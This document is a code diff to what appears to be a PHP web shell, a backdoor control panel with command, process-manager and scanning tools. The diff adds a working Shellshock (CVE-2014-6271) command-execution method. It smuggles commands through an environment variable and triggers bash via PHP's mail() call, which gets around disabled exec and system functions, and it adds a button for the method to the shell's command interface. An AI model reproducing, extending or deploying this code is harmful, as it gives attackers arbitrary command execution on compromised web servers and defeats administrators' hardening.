@@ -646,6 +646,10 @@ function evalRel($command)
 			echo $stdout;
 		}
 	}
+	else if($shellshock == True)
+	{
+		echo shellshock($command);
+	}
 	else if($cgi == True)
 	{
 		$command = base64encoding($command);
@@ -664,6 +668,19 @@ function evalRel($command)
 	}
 }
 #<--
+
+function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283
+	if(strstr(readlink("/bin/sh"), "bash") != FALSE) {
+		$tmp = tempnam(".","data");
+		putenv("PHP_LOL=() { x; }; $cmd >$tmp 2>&1");
+		mail("a@127.0.0.1","","","","-bv"); // -bv so we don't actually send any mail
+	}
+	else return "Er 1";
+	$output = @file_get_contents($tmp);
+	@unlink($tmp);
+	if($output != "") return $output;
+	else return "Er 2";
+}
 
 #Zips Windows Dir-->
 function zipWindows($zip_location, $folder)
@@ -785,6 +802,15 @@ foreach($softwares as $function)
 	}
 }
 #<--
+
+if (shellshock("pwd") != "Er 1" || shellshock("pwd") != "Er 2")
+{
+	$shellshock = True;
+}
+else
+{
+	$shellshock = False;
+}
 
 #CGI Incoming-->
 $_SESSION["onlinecgi"] = "";
@@ -2051,7 +2077,7 @@ else if(isset($_GET["zip"]))
 			{
 				if(evalRel("zip -r $archiveName $archiveName")=="False")
 				{
-					echo "<p class='danger'>Can't Zip because 'exec', 'shell_exec', 'system', 'passthru', `popen`, `proc_open` and `cgi` are Disabled.</p>";
+					echo "<p class='danger'>Can't Zip because 'exec', 'shell_exec', 'system', 'passthru', `popen`, `proc_open`, 'shellshock', and `cgi` are Disabled.</p>";
 					$zipFail = True;
 				}
 
@@ -2466,7 +2492,7 @@ else
 }
 
 #Commander-->
-if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True))
+if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shellshock == True))
 {
 echo "
 <br><h3><A NAME='Commander' href=\"#Commander\">Commander</A></h3>";
@@ -2486,6 +2512,7 @@ if(isset($_POST["passthru"])) $_SESSION["command_function"] = "passthru";
 if(isset($_POST["popen"])) $_SESSION["command_function"] = "popen";
 if(isset($_POST["proc_open"])) $_SESSION["command_function"] = "proc_open";
 if(isset($_POST["cgi"])) $_SESSION["command_function"] = "cgi";
+if(isset($_POST["shellshock"])) $_SESSION["command_function"] = "shellshock";
 if(!isset($_SESSION["command_function"])) $_SESSION["command_function"] = "system";
 
 if($system == True)
@@ -2569,6 +2596,17 @@ if ($cgi == True)
 	echo '<input type="submit" name="cgi" value="CGI" '; 
 	
 	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "cgi")
+	{
+		echo ' style="background-color: red;"';
+	}
+
+	echo "> ";
+}
+if ($shellshock == True)
+{
+	echo '<input type="submit" name="shellshock" value="shellshock" '; 
+	
+	if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "shellshock")
 	{
 		echo ' style="background-color: red;"';
 	}
@@ -2689,7 +2727,12 @@ else
 				}				
 				$decCommand = base64decoding($decCommand);
 			}
-		
+
+			if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "shellshock")
+			{
+				$response = shellshock($decCommand." 2>&1");
+			}
+
 			echo "<table class='flat-table flat-table-1'>";
 			echo "<tr><td>".$decCommand."</td>";
 			echo "<td><pre>";
@@ -2824,7 +2867,7 @@ if(isset($_POST["run"]))
 		runPHP($decEval);
 	}
 	
-	if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True))
+	if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shellshock == True))
 	{
 
 		if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
@@ -2955,7 +2998,7 @@ if(isset($_POST["run"]))
 #<--
 
 #Process Manager-->
-if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True))
+if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shellshock == True))
 {
 echo "
 <br><br><h3><A NAME='Process Manager' href=\"#Process Manager\">Process Manager</A></h3>";
@@ -3695,7 +3738,7 @@ if(isset($_GET["tool"]) && ($_GET["tool"] == "bpscanp"))
 
 <?php
 
-if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True))
+if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shellshock == True))
 {
 echo "
 <table class='flat-table flat-table-3'>
@@ -3733,7 +3776,7 @@ echo "
 		<td>Description</td>
 		<td>Action</td>
 	</tr>";
-if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True))
+if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True) || ($cgi == True) || ($shellshock == True))
 {
 	echo "
 	<form action='?tool=bpscan#Tools' method='post' >
